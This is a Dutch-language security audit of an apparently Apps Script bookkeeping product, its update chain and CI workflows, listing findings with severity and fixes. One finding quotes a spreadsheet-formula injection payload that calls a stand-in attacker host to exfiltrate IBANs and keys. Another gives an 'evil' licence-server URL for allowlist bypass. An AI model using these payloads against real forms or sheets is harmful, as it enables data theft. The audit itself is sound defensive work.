#### F-RED-104 [LAAG] src/Triggers.gs:2350-2357
Quote: `Foutmelding: ${err.message}\n\nStack: ${err.stack}`
Probleem: volledige stacktrace per mail ⇒ onnodig lek-oppervlak (kan property-waarden bevatten).
Fix: alleen afgekapte message/fout-ID per mail; stack naar Logger. Owner: Sam (dev)

#### F-RED-105 [HOOG] src/Triggers.gs:629-653, 964-977, 1151-1161, 1302-1328 (× Boekingen.gs:1140-1143)
Quote: `factuurData = [ ..., klantnaam, data['KvK-nummer klant']||'', ..., regels.map(r=>r.omschr).join('; '), ... ]; vfSheet.appendRow(factuurData);`
Probleem: Google-Form-paden + zoekOfMaakRelatie_ schrijven form-velden ongesanitiseerd naar VF/IF/RELATIES, terwijl het dialog-pad wél dubbel saniteert — kerninconsistentie. Form is doorgaans open-met-link ⇒ externe kan =IMPORTXML("//attacker?d="&JOIN(",",Instellingen!B:B)) insturen ⇒ exfiltratie van Instellingen (IBAN/keys) of phishing; reist mee in PDF/UBL naar de klant.
Fix: saniteerObject_(data) direct na opbouw in verwerkHoofdformulier (466) en verwerkVerkoopfactuurFormulier (1252); saniteer_ op displayNaam.
Owner: Sam (dev)

#### F-RED-106 [MIDDEL] src/Triggers.gs:462-481 (+1248-1252)
Quote: `antwoorden.forEach(r => { data[r.getItem().getTitle()] = r.getResponse(); });`
Probleem: form-item-TITELS als object-keys zonder Object.create(null)/allowlist; Form-pad mist de saniteerObject_-key-guard van het dialog-pad ⇒ __proto__/constructor-titel = prototype-pollution-oppervlak (vereist Form-controle ⇒ MIDDEL).
Fix: Object.create(null) + titel-allowlist + zelfde saniteerObject_. Owner: Sam (dev)

Prioritaire lijn RED-F: centrale sanitisatie op Form/Import-pad (dekt 100+105), setInstelling_-saniteer (102), Onboarding-escapes (101).

## Batch RED-G — UpdateApply, UpdateBundle, Utils, Verkoopfacturen, XafExport, scripts(bundle-create/deploy-licence-release/mutation-meting)
KERNBEVINDING: de auto-update-keten is een RCE-primitief zonder echt trust-anchor. Verkoopfacturen veilig bevonden (escHtml_/UBL-esc_/hex-kleur/numerieke garanties + mutex+idempotency); XafExport _xafEsc_ correct (& eerst).

#### F-RED-120 [HOOG] src/UpdateApply.gs:104 (+176, 227-237)
Quote: `const nieuw = bundle.files.map(function(f){ return { name: f.naam, type: 'SERVER_JS', source: f.source }; });`
Probleem: voerAutomatischeUpdateUit_ herschrijft de VOLLEDIGE klant-broncode met bundle.files zonder onafhankelijke authenticiteitscontrole (enige "verificatie" = interne hash, F-RED-122). Wie de bundle beïnvloedt (gekaapte server/Drive/MITM via F-RED-121/124) krijgt RCE bij elke klant met auto-update: arbitraire .gs draait met klant-OAuth-scopes (Drive/Gmail/Sheets) ⇒ administratie leegtrekken, mail-exfiltratie, brick.
Fix: asymmetrische handtekening (Sams private key) over de canonical files-array; public key in niet-overschreven Config; weigeren bij invalide signature. Owner: Sam (dev)
#### F-RED-121 [HOOG] src/UpdateBundle.gs:231
Quote: `const resp = UrlFetchApp.fetch(url, { muteHttpExceptions: true, followRedirects: true });`
Probleem: bundle-fetch via rauwe UrlFetchApp naar klant-instelbare LICENTIE_SERVER_URL, NIET via veiligFetch_/allowlist, followRedirects:true ⇒ wie die property zet (of open-redirect misbruikt) levert een kwaadaardige bundle die via F-RED-122 de hash-check passeert en via F-RED-120 draait.
Fix: via veiligFetch_ met followRedirects:false; endpoint pinnen op vaste niet-klant-host (*.boekhoudbaar.nl-suffix). Owner: Sam (dev)
#### F-RED-122 [HOOG] src/UpdateBundle.gs:240 (+bundle-create.js:61-72)
Quote: `const lokaal = _berekenBundleHash_(res.files); if (lokaal !== res.hash) {`
Probleem: hash berekend over res.files en vergeleken met res.hash — beide uit hetzelfde antwoord ⇒ detecteert alleen corruptie, geen manipulatie; aanvaller levert kwaadaardige files + bijbehorende hash. Het ontbrekende trust-anchor van de hele keten.
Fix: signature-verificatie tegen ingebakken public key. Owner: Sam (dev)
#### F-RED-123 [LAAG] src/UpdateBundle.gs:77,161 — klantnaam via template-literal in dialog-HTML (res.versie/hash gaan wél via textContent). Fix: escHtml_(klantnaam). Owner: Sam.
#### F-RED-124 [HOOG] src/Utils.gs:1276
Quote: `const lijst = extraHost ? _UITGAAND_ALLOWLIST.concat([extraHost]) : _UITGAAND_ALLOWLIST;`
Probleem: _isToegestaneUrl_ voegt de host uit klant-instelbare LICENTIE_SERVER_URL toe aan de allowlist — terwijl de JSDoc (1248-1251) juist "bescherming tegen klant-geknoeide LICENTIE_SERVER_URL" als doel noemt. LICENTIE_SERVER_URL=https://evil ⇒ evil op allowlist ⇒ veiligFetch_ exfiltreert licentiesleutel/email; SSRF-grens omzeild.
Fix: licentieserver-host niet uit klant-input; pinnen op vaste constante/suffix. Owner: Sam (dev)
#### F-RED-125 [MIDDEL] src/Utils.gs:1314
Quote: `out.push(tekst.charCodeAt(i) ^ salt.charCodeAt(i % salt.length));`
Probleem: API-keys "versleuteld" met repeating-XOR tegen salt in dezelfde ScriptProperties ⇒ wie properties leest heeft ciphertext + sleutel ⇒ trivially te ontsleutelen; bekende plaintext-prefix (live_/test_) lekt salt-bytes. zetKvkApiKey belooft "niet zichtbaar" (1465) — misleidend.
Fix: eerlijk als obfuscatie benoemen; geen secret-belofte; geen salt naast data. Owner: Sam (dev)
#### F-RED-126 [LAAG] src/XafExport.gs:126 — fallback-textarea escape-volgorde fout (< eerst, & daarna) ⇒ &amp;amp;lt; corruptie van het kopieer-XAF (geen XSS, wel kapotte exit-route). Fix: & eerst escapen. Owner: Sam.
#### F-RED-127 [MIDDEL] scripts/bundle-create.js:93
Quote: `log('     Rechtermuisknop → "Share" → "Anyone with the link can VIEW".');`
Probleem: release-procedure adviseert bundle-Drive-file publiek; met ontbrekende signing (F-RED-122) rust integriteit van klant-code op fileId-geheimhouding + Drive-ACL ⇒ uitgelekte fileId / Drive-compromittering = RCE-keten naar alle klanten.
Fix: signing + bundle-file Sam-only. Owner: Sam (dev)
#### F-RED-128 [HOOG] scripts/deploy-licence-release.js:37
Quote: `env: { ...process.env, NODE_TLS_REJECT_UNAUTHORIZED: '0' },`
Probleem: TLS-certificaatvalidatie uit voor alle child-processen (clasp push/deploy) ⇒ MITM op de release-pipeline = kwaadaardige code naar de live licence-server /exec die álle klanten raakt (validatie + bundle-endpoint). Geen comment waarom.
Fix: regel verwijderen; NODE_EXTRA_CA_CERTS voor een specifieke interne CA indien nodig. Owner: Sam (dev)
#### F-RED-129 [LAAG] scripts/mutation-meting.js:126
Quote: `fs.writeFileSync(fullPath, muteSrc, 'utf8'); const result = runTests();`
Probleem: muteert echte src/*.gs en herstelt pas in finally ⇒ crash/Ctrl-C laat gemuteerde bron achter die per ongeluk gebundeld/gedeployd kan worden (subtiel foute financiële/validatie-logica bij klanten).
Fix: muteren op kopie/temp of in-memory; SIGINT-handler die altijd herstelt. Owner: Sam (dev)

Prioriteit RED-G: 1) signature over bundle (120/122); 2) host niet uit klant-property + veiligFetch_ (124/121); 3) NODE_TLS_REJECT_UNAUTHORIZED weg (128); 4) bundle niet publiek (127).

## Wave A — red_01 (scripts + workflows) — gelezen volledig, sha's geverifieerd
[F-RED-135] HOOG .github/workflows/deploy.yml:8-11/:64 — `pull_request:` trigger; lint/test-jobs draaien `npm ci`+test op fork-PR-code → CI-RCE via postinstall/lifecycle. GITHUB_TOKEN read-only + geen deploy-secrets in die jobs (daarom HOOG niet BLOCKER). Fix: expliciet `permissions: read-all` + environment-approval voor untrusted PR's.
[F-RED-131] HOOG scripts/clasp-push.js:23 — `NODE_TLS_REJECT_UNAUTHORIZED:'0'` schakelt TLS-certvalidatie uit voor clasp-push (OAuth-token met schrijfrechten naar Apps Script). MITM kan token+broncode stelen. Fix: `NODE_EXTRA_CA_CERTS` pinnen i.p.v. globale bypass.
[F-RED-136] HOOG .github/workflows/deploy.yml:192/:218/:247 — zelfde TLS-bypass in CI (3×), terwijl vers OAuth-token in ~/.clasprc.json staat. Fix: env-var verwijderen.
[F-RED-133] MIDDEL scripts/update-changelog.js:32/:40-48 — commit-subjects (`%s`) ongefilterd in website/changelog.json (homepage-render). Stored-XSS-bron als renderer niet escapet. Fix: titel HTML-escapen / textContent.
[F-RED-134] MIDDEL .github/workflows/auto-update-version.yml:19-26/:48 — `contents: write` + `git push` naar main + uitvoeren van repo-scripts ná checkout → privilege-escalatie als script via PR is aangepast; `[skip ci]`-loopguard broos. Fix: `persist-credentials:false`, minimale permissions, scripts pinnen.
[F-RED-130] LAAG scripts/add-breadcrumbs.js:45/:53-55 — JSON.stringify(h1Tekst) in `<script type=ld+json>` escapet `<` niet → `</script>`-breakout mogelijk (build-script over eigen content). Fix: `<`→`<`.
[F-RED-132] LAAG scripts/deploy-check.js:27-31 — admin-mail `samhoven16@gmail.com` hardcoded + print "bypass actief" → recon. Fix: admin-identiteit uit niet-gecommitte config.
[F-RED-137] LAAG deploy.yml:198/:264 — volledige clasp-output onvoorwaardelijk geëchood naar CI-log (token-leak-risico bij auth-fout). Fix: output maskeren/alleen exitcode.
[F-RED-138] LAAG deploy.yml:288-292 — Cloudflare `purge_everything` per deploy → cache-thrash/kosten als deploys triggerbaar. Fix: gerichte purge.
[F-RED-139] LAAG deploy.yml:85 — `npm install -g @google/clasp` ongepind → supply-chain bij clasp-compromittering met vers token aanwezig. Fix: versie pinnen.

## Wave A — red_02 (workflows) — gelezen volledig
[F-RED-150] LAAG .github/workflows/keep-codespaces-alive.yml:60-74 — codespace-`name` uit API ongequote in curl-URL; geen echte injectie (geen shell-eval) maar PAT-scope account-breed. Observatie/hygiene.
[F-RED-151] LAAG .github/workflows/keep-codespaces-alive.yml:8-16 — setup adviseert PAT zonder expiratie + account-brede Codespaces-write als langlevend repo-secret → lekkagerisico zonder rotatie. Fix: korte expiratie + repo-scoped.
